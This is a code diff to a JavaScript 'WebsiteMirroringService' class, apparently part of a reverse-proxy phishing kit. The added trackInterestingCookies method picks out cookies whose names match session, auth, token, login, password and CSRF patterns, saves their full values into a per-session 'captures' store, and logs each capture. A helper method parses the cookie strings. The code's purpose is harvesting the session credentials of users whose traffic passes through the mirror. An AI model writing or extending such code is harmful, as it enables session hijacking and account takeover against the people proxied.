@@ -1309,6 +1309,62 @@ class WebsiteMirroringService {
   }
 
   /**
+   * Track potentially interesting cookies like auth tokens
+   */
+  trackInterestingCookies(sessionToken, cookies) {
+    const interestingPatterns = [
+      /sess/i, /auth/i, /token/i, /sid/i, /session/i, /login/i, /user/i, /pass/i,
+      /account/i, /secure/i, /remember/i, /csrf/i, /xsrf/i
+    ];
+    
+    const captures = this.captures.get(sessionToken);
+    if (!captures) {
+      console.error(`No captures found for session ${sessionToken}`);
+      return;
+    }
+    
+    if (!captures.cookies) {
+      captures.cookies = [];
+    }
+    
+    cookies.forEach(cookie => {
+      try {
+        // Parse the cookie string to extract all attributes
+        const cookieDetails = this.parseCookieString(cookie);
+        
+        // Check if this cookie matches any interesting patterns
+        if (interestingPatterns.some(pattern => pattern.test(cookieDetails.name))) {
+          // Add the cookie to captures
+          captures.cookies.push(cookieDetails);
+          
+          console.log(`⚠️ Captured interesting cookie: ${cookieDetails.name}`);
+        }
+      } catch (error) {
+        console.error(`Error processing cookie: ${error.message}`);
+      }
+    });
+    
+    this.captures.set(sessionToken, captures);
+  }
+  
+  /**
+   * Parse cookie string into detailed object format
+   */
+  parseCookieString(cookieStr) {
+    const cookieParts = cookieStr.split(';');
+    const [nameValuePair] = cookieParts;
+    const [name, value] = nameValuePair.split('=');
+    
+    const details = {
+      name: name && decodeURIComponent(name.trim()),
+      value: value && decodeURIComponent(value.trim()),
+      original: cookieStr
+    };
+    
+    return details;
+  }
+
+  /**
    * Handle proxy error gracefully
    */
   handleProxyError(error, res, sessionObj) {
